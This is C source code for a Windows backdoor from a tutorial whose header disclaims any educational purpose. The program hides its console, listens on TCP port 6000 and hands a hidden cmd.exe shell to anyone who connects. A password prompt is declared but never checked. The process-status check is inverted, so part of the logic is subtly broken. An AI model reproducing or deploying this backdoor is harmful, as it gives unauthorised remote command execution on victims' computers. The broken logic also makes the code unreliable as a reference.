﻿/******************************************************************
*   Source code from the "Writing a basic backdoor in C" tutorial *
*                                                                 *
*   NOT Written for educational purposes only!!                   *
*                                                                 *
*   Tested with Dev-C++ 4.9.9.2, should work with other compilers *
*   as well.                                                      *
*                                                                 *                  *
******************************************************************/

/*
Don't forget to link winsock32.lib otherwise your compiler won't understand the sockets
*/
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>

//our variables, we need them globally to use them in all functions
const char welcome[] = "Welcome, enter your password please : ";
char bufferin[1024]; //the buffer to read data from socket
char bufferout[65535]; //the buffer to write data to the socket
int i, port; // i is used for loop , port is going to keep the portnumber
SOCKET locsock, remsock;  //the sockets we are going to need
SOCKADDR_IN sinloc, sinrem; //the structures needed for our sockets
WSADATA wsadata; //wsadata
STARTUPINFO startinfo; //startupinfo structure for CreateProcess
SECURITY_ATTRIBUTES secat; //security attributes structure needed for CreateProcess
PROCESS_INFORMATION procinfo; //process info struct needed for CreateProcess
int bytesWritten;  //number of bytes written gets stored here
DWORD bytesRead, avail, exitcode; //number of bytes read, number of bytes available
//and the exitcode

void CommandPrompt(void);       //the function to give the command prompt
int main() //the main function
{
	//hide console
	FreeConsole();
	//set listen port
	port = 6000;
	//tell windows we want to use sockets
	WSAStartup(0x101, &wsadata);
	//create socket
	locsock = socket(AF_INET, SOCK_STREAM, 0);

	//fill structure
	sinloc.sin_family = AF_INET;
	sinloc.sin_addr.s_addr = INADDR_ANY;
	sinloc.sin_port = htons(port);

	//bind the socket to the specified port
	if (bind(locsock, (SOCKADDR*)&sinloc, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
	{
		WSACleanup();
		printf("Error binding socket.");
		return EXIT_FAILURE;
	}

	//listen on the specified socket
	if (listen(locsock, 5) == SOCKET_ERROR)
	{
		WSACleanup();
		printf("Error listening socket.");
		return EXIT_FAILURE;
	}

	//infinite loop here to keep the program listening
	while (1)
	{
		remsock = SOCKET_ERROR;
		while (remsock == SOCKET_ERROR)
		{
			//accept connection to our program
			remsock = accept(locsock, NULL, NULL);
			if (remsock == INVALID_SOCKET)
			{
				//cleanup and exit program
				WSACleanup();
				printf("Error accepting socket.");
				return EXIT_FAILURE;
			}

			CommandPrompt(); //start the commandprompt function
		}
		closesocket(remsock); //close the socket
	}
	//we should never reach this point, but i've put this hear just in case 😉
	return EXIT_SUCCESS;

}

//*************************************************************
void CommandPrompt(void) //the function which handles the complete commandprompt
{
	secat.nLength = sizeof(SECURITY_ATTRIBUTES);
	secat.bInheritHandle = TRUE;
	DWORD bytesW;             //number of bytes written gets stored here
	HANDLE newstdin, newstdout, readout, writein; //the handles for our Pipes
	char exit1[] = { 'e','x','i','t',10,0 }; //we need this to compare our command to 'exit'
	char exit2[] = { 'E','X','I','T',10,0 }; //we need this to compare our command to 'EXIT'

	//create the pipes for our command prompt
	CreatePipe(&newstdin, &writein, &secat, 0);
	CreatePipe(&readout, &newstdout, &secat, 0);

	GetStartupInfo(&startinfo);

	//fill another structure
	startinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	startinfo.wShowWindow = SW_HIDE;
	startinfo.hStdOutput = newstdout;
	startinfo.hStdError = newstdout;
	startinfo.hStdInput = newstdin;

	wchar_t cmd[] = L"cmd.exe"; //the command we want to start

	//start cmd prompt
	CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &startinfo, &procinfo);
	//endless loop
	while (1)
	{
		//check if cmd.exe is still running, if not then cleanup and start listening again.
		if (GetExitCodeProcess(procinfo.hProcess, &exitcode) == STILL_ACTIVE)
		{
			CloseHandle(procinfo.hThread);
			CloseHandle(procinfo.hProcess);
			CloseHandle(newstdin);
			CloseHandle(writein);
			CloseHandle(readout);
			CloseHandle(newstdout);
			break;
		}
		bytesRead = 0;
		//Sleep 0.5 seconds to give cmd.exe the chance to startup
		Sleep(500);
		//check if the pipe already contains something we can write to output
		PeekNamedPipe(readout, bufferout, sizeof(bufferout), &bytesRead, &avail, NULL);
		if (bytesRead != 0)
		{
			while (bytesRead != 0)
			{     //read data from cmd.exe and send to client, then clear the buffer
				int res = ReadFile(readout, bufferout, sizeof(bufferout), &bytesRead, NULL);
				send(remsock, bufferout, strlen(bufferout), 0);
				ZeroMemory(bufferout, sizeof(bufferout));
				Sleep(100);
				PeekNamedPipe(readout, bufferout, sizeof(bufferout), &bytesRead, &avail, NULL);
			}
		}
		// clear bufferin
		ZeroMemory(bufferin, sizeof(bufferin));
		//receive the command given
		recv(remsock, bufferin, sizeof(bufferin), 0);
		//if command is 'exit' or 'EXIT' then we have to capture it to prevent our program
		//from hanging.
		if ((strcmp(bufferin, exit1) == 0) || (strcmp(bufferin, exit2) == 0))
		{
			//let cmd.exe close by giving the command, then go to closeup label
			WriteFile(writein, bufferin, strlen(bufferin), &bytesW, NULL);
			goto closeup;
		}
		//else write the command to cmd.exe
		WriteFile(writein, bufferin, strlen(bufferin), &bytesW, NULL);
		//clear the bufferin
		for (i = 0; i < sizeof(bufferin); i++)
		{
			bufferin[i] = 0;
		}
	}
	//close up all handles
closeup:
	CloseHandle(procinfo.hThread);
	CloseHandle(procinfo.hProcess);
	CloseHandle(newstdin);
	CloseHandle(writein);
	CloseHandle(readout);
	CloseHandle(newstdout);
}